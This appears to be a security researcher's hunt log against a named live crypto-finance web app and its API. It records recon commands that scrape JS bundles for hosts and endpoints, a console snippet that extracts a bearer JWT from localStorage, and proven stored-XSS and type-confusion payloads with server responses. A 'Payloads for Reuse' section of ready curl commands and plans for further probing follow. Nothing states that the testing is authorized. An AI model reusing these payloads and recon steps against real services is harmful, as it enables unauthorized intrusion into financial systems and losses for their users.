# Modulo Finance — Hybrid Web2/Web3 Hunt (2026-08-12)

## Target Shape
- `www.modulo.finance` = Webflow static (no sink)
- `app.modulo.finance` + `staging.modulo.finance` = React SPA on Fly.io (`fly-request-id`, `x-powered-by: Express`)
- API: `modulo-canton-app-api-client-mainnet-prod.fly.dev` + `testnet-staging` sibling
- Ledger: Canton Mainnet (CC/Amulet, MOD, CBTC, cETH, EDELx) via Cubist signer `Key#CantonEd25519_cubist::...`
- Auth: Auth0 `canton-mainnet-2.us.auth0.com` client `IJ0NkQST4x9w7e4BK78PdUktGlvDKVpW`, audience `https://client-api.modulo.finance`, RS256 only

## Recon Technique That Worked
1. **Bundle host extraction:** `curl -skL /assets/index-DIEFGZ4n.js | grep -oE "https?://[^\"']*fly\\.dev[^\"']*|https?://client-api[^\"']*"` → found prod + staging Fly hosts without git history.
2. **Endpoint enum via minified JS:** `grep -oE "/api/[^\"']*"` on bundle → 20+ endpoints: `/api/canton/transfer`, `/api/canton/dvp`, `/api/migration/import`, `/api/address-book`, etc.
3. **JWT location trap:** Cookie `auth0.*.is.authenticated=true` is NOT the token. Real Bearer in `localStorage` key `@@auth0spajs@@` → `body.access_token` or via Network `Authorization: Bearer <REDACTED-JWT>`. Copy via console: `copy(JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.includes('@@auth0spajs@@'))).body.access_token)`.
4. **Pre-auth gate verification:** 13 endpoints all `401 {"Authentication required"}` unauth (GET+POST) — proves deny-by-default. Only `/api/health` 200 unauth.

## Authenticated Findings (PROVEN, throttled 0.8-1.2s)
### 1. Stored XSS via `address-book` label
- `POST /api/address-book {"address":"Pool-Orchestrator::1220...","label":"<img src=x onerror=alert(1)>"} → 201` stores raw HTML, `GET` returns it unescaped.
- Variants: `<svg onload=alert(document.domain)>`, `{{7*7}}`, `';alert(1)//` all 201. Cleanup via `DELETE /api/address-book/{id}` required.
- Root cause: missing `z.string().regex(/^[^<>]*$/)` / DOMPurify on server, no CSP.

### 2. Type-Confusion → 500/502
- `POST /api/canton/transfer {"receiverPartyId":{"$ne":null},"quantity":"0.001","instrumentId":"Amulet"} → 500 Internal server error`
- `{"quantity":{"$gt":"0"}} → 500`, `{"instrumentId":{"$gt":""}} → 502 Bad Gateway` (Canton proxy crash).
- Indicates Zod not `strict()` and no string-type guard before forwarding to Canton.

### 3. Fee-burn pitfall (mainnet)
- 4 self-transfers + 1 DVP burned ~20.29 CC (30.71 → 10.42). Each `transfer` costs `internalTransferFeeUsd 0.25` + `transferFeeUsd 0.75` via CC/Amulet. Self-transfer to `modulo::122010cbd...` is allowed.
- **Lesson:** Brutal fuzz MUST use staging `testnet-staging.fly.dev` + testnet JWT (`canton-testnet-1`) to avoid real cost. One validated `POST /api/canton/dvp {"swapFromAmount":"0.01","swapFromInstrumentId":"Amulet","swapToInstrumentId":"MOD"} → 201` is enough to prove flow.

## CDC Stall Pattern
- Pre-auth theories (Logic Bypass / Deserialization / JWT alg) all BLOCKED after 2 rounds at 401 gate. Correct verdict: `HIGH confidence pre-auth closed, THEORETICAL RCE unproven` — not a failed hunt, a verified negative.
- Chaining requires `Bug A (auth bypass) → Bug B (RCE)`; without A, chain cannot exist. Report honest negative + pivot to post-auth.

## Payloads for Reuse
```bash
# XSS
curl -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" \
  -d '{"address":"Pool-Orchestrator::1220bbd47c5a10d5540c420e1f8f0f1fd513464ec6110dbd5123970dbe3b538805d3","label":"<img src=x onerror=alert(1)>"}' \
  $BASE/api/address-book
# Type confusion
curl -H "Authorization: Bearer $JWT" -d '{"receiverPartyId":{"$ne":null},"quantity":"0.001","instrumentId":"Amulet"}' $BASE/api/canton/transfer
```

## Next Hunt Improvements
- Add `/assets/*.js.map` sourceMap probe for Next.js.
- Test `memoTag`/`description` rendering in `portfolio`/`activity/transfers` for stored XSS amplification.
- Check `hub.modulo.finance` OAuth Telegram callback `/api/account-linking-oauth/telegram/callback` for state confusion.
